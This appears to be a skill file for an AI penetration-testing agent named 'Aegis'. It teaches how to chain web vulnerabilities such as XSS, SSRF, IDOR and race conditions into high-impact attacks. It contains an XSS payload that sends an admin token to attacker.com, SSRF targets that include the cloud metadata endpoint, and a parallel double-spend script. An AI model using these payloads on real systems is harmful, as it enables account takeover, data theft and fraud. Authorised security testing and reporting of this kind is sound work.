---
name: vuln_chaining
description: Vulnerability chaining engine - combine multiple low-severity findings into high-impact attack chains
---

# Vulnerability Chaining Engine

Transform isolated low-severity findings into devastating attack chains. Individual bugs are starting points — chain them for maximum impact.

## Core Principle

> "The whole is greater than the sum of its parts."
> A low-severity info leak + a medium-severity auth bypass = a critical full compromise.

## Chaining Methodology

### Step 1: Map All Findings

Before chaining, inventory every validated finding:

```
Finding Inventory:
- Finding A: Info Disclosure (Medium) - Version numbers exposed
- Finding B: Weak Credentials (Medium) - Default admin:admin
- Finding C: IDOR (Low) - User ID enumeration
- Finding D: XSS (Medium) - Reflected XSS in search
```

### Step 2: Identify Pivot Points

Ask: "What does this finding unlock?"

```
Finding A (Info Disclosure)
├── Reveals: Technology stack (Node.js 14.x)
├── Pivot to: Known CVEs for that version
└── Impact: Remote Code Execution

Finding B (Weak Credentials)
├── Grants: Admin panel access
├── Pivot to: All admin functions
└── Impact: Full platform compromise

Finding C (IDOR)
├── Grants: Access to other users' data
├── Pivot to: Data exfiltration
└── Impact: Mass data breach
```

### Step 3: Build Attack Chains

Connect findings into linear attack paths:

**Chain 1: Recon → Exploit → Privilege Escalation**
```
Finding A (Info Disclosure)
    ↓ reveals technology stack
Finding E (Known CVE for Node.js 14)
    ↓ exploit grants initial access
Finding B (Weak Credentials)
    ↓ use default creds for escalation
Finding F (No RBAC)
    ↓ access admin panel
Full Platform Compromise
```

**Chain 2: Injection → Data Access → Lateral Movement**
```
Finding D (XSS in search)
    ↓ steal admin JWT token
Finding G (JWT has weak secret)
    ↓ forge admin tokens
Finding C (IDOR)
    ↓ enumerate all user IDs
Finding H (API has no rate limit)
    ↓ mass data exfiltration
Complete Data Breach
```

**Chain 3: SSRF → Internal Access → Credential Theft**
```
Finding I (SSRF in webhook)
    ↓ access internal services
Finding J (Internal admin panel exposed)
    ↓ access admin functions
Finding K (Default creds on internal service)
    ↓ escalate to internal admin
Finding L (Internal DB accessible)
    ↓ extract all credentials
Full Infrastructure Compromise
```

## Chaining Techniques

### 1. Information Disclosure → Exploitation

```python
# Pattern: Info leak reveals attack surface
info_leak_finding = {
    "type": "information_disclosure",
    "reveals": ["technology_stack", "version_numbers", "internal_paths"]
}

# Chain: Use revealed info to find specific exploits
def chain_info_to_exploit(info_finding):
    tech_stack = info_finding.get("reveals", [])
    
    # Map technology to known vulnerabilities
    vuln_db = {
        "nodejs_14": ["CVE-2021-22884", "CVE-2021-22883"],
        "express_4.17": ["CVE-2024-29041"],
        "redis_6.0": ["CVE-2021-32672"],
    }
    
    for tech in tech_stack:
        if tech in vuln_db:
            return {
                "chain": "info_to_exploit",
                "vulns": vuln_db[tech],
                "impact": "Remote Code Execution"
            }
```

### 2. Authentication Bypass → Authorization Bypass

```python
# Pattern: Bypass auth, then bypass authz
auth_bypass_finding = {
    "type": "authentication_bypass",
    "technique": "default_credentials"
}

def chain_auth_bypass(auth_finding):
    # Default creds give us a valid session
    # Now test authorization on admin endpoints
    
    admin_endpoints = [
        "/admin/users",
        "/admin/settings",
        "/admin/api-keys",
    ]
    
    return {
        "chain": "auth_bypass_to_authz_bypass",
        "next_step": "Test admin endpoints with default creds",
        "impact": "Full admin access"
    }
```

### 3. XSS → Session Hijacking → Account Takeover

```python
# Pattern: XSS steals tokens, tokens give access
xss_finding = {
    "type": "reflected_xss",
    "location": "search parameter"
}

def chain_xss_to_takeover(xss_finding):
    # XSS can steal JWT from localStorage
    
    xss_payload = """
    <script>
    fetch('https://attacker.com/steal?token=' + 
          localStorage.getItem('admin_token'));
    </script>
    """
    
    return {
        "chain": "xss_to_token_theft",
        "payload": xss_payload,
        "impact": "Account takeover via token theft"
    }
```

### 4. SSRF → Internal Access → Privilege Escalation

```python
# Pattern: SSRF reaches internal services
ssrf_finding = {
    "type": "ssrf",
    "location": "webhook URL parameter"
}

def chain_ssrf_to_privesc(ssrf_finding):
    # SSRF can reach internal admin panel
    
    internal_targets = [
        "http://127.0.0.1:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://internal-service:3000/health",
    ]
    
    return {
        "chain": "ssrf_to_internal_access",
        "targets": internal_targets,
        "impact": "Internal network compromise"
    }
```

### 5. Race Condition → Double Spend → Financial Fraud

```python
# Pattern: Race condition enables financial fraud
race_finding = {
    "type": "race_condition",
    "location": "payment endpoint"
}

def chain_race_to_fraud(race_finding):
    # Parallel payment requests can double-spend
    
    return {
        "chain": "race_to_double_spend",
        "exploit": """
        import concurrent.futures
        import requests
        
        def make_payment():
            return requests.post('/api/payment', json={
                'amount': 100,
                'currency': 'USD'
            })
        
        # Send 10 parallel payment requests
        with ThreadPoolExecutor(max_workers=10) as e:
            futures = [e.submit(make_payment) for _ in range(10)]
            results = [f.result() for f in futures]
        
        # Multiple 200 OK = double spend achieved
        """,
        "impact": "Financial fraud"
    }
```

## Chain Documentation

Every attack chain must be documented:

```markdown
## Attack Chain: [Chain Name]

### Findings Used
1. Finding A: [Title] (Severity)
2. Finding B: [Title] (Severity)

### Attack Path
```
Step 1: [Action]
  └── Result: [What we get]

Step 2: [Action]
  └── Result: [What we get]

Step 3: [Action]
  └── Result: [Final impact]
```

### Impact
- **Confidentiality**: [What data is exposed]
- **Integrity**: [What can be modified]
- **Availability**: [What can be disrupted]

### PoC
[Complete working exploit code]

### Remediation
[How to break the chain]
```

## Chaining Heuristics

| Finding Type | Look For | Chain With |
|--------------|----------|------------|
| Info Disclosure | Version numbers, internal paths | Known CVEs, admin panels |
| Weak Credentials | Default passwords, no lockout | All authenticated functions |
| IDOR | User ID enumeration | Data exfiltration, privilege escalation |
| XSS | Token theft, session hijacking | Account takeover, admin access |
| SSRF | Internal network access | Internal services, cloud metadata |
| Race Conditions | Double spend, TOCTOU | Financial fraud, auth bypass |
| Misconfig | Debug mode, verbose errors | Information gathering, exploitation |

## Anti-Patterns

Don't chain:
- Two low-severity findings that don't connect
- Findings in different applications
- Theoretical chains without working PoC
- Chains that require impossible conditions

## Integration with Aegis

After finding all vulnerabilities:

1. Map every finding with its pivot points
2. Identify which findings can be chained
3. Build complete attack paths
4. Calculate combined CVSS score
5. Report as a single high-impact chain
